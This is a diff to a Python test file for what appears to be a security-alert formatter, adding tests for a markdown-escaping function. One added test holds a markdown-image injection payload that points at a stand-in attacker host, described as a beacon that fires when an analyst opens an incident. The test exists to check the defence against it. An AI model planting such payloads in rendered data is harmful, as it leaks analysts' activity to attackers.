@@ -1,6 +1,4 @@
-import pytest
-from shared.formatters import format_timestamp, format_mitre, categorize_evidence
-from shared.schemas import AlertView
+from shared.formatters import format_timestamp, format_mitre, categorize_evidence, escape_markdown
 
 def test_format_timestamp_valid():
     ts = "2026-09-01T08:20:31.103820+00:00"
@@ -39,3 +37,21 @@ def test_categorize_evidence():
     # Unknown/Missing facts
     assert "process_name" in unk
     assert "user_id" in unk
+
+def test_escape_markdown_neutralizes_link_and_image_injection():
+    # The concrete exploit from the audit: a crafted DNS query rendered as
+    # a markdown image, which would make the analyst's browser fetch an
+    # attacker URL the instant the incident is opened.
+    payload = "`![](https://attacker.tld/beacon?h=x)`"
+    escaped = escape_markdown(payload)
+    assert "![" not in escaped
+    assert "](" not in escaped
+    # Every special character is backslash-escaped
+    assert escaped == r"\`\!\[\]\(https://attacker\.tld/beacon?h=x\)\`"
+
+def test_escape_markdown_is_visually_inert_for_ordinary_values():
+    # CommonMark consumes the backslash and renders the literal character,
+    # so ordinary evidence values (IPs, hostnames) are unaffected visually
+    # -- only demonstrating that escaping doesn't mangle common content.
+    assert escape_markdown("10.0.0.1") == r"10\.0\.0\.1"
+    assert escape_markdown(500) == "500"
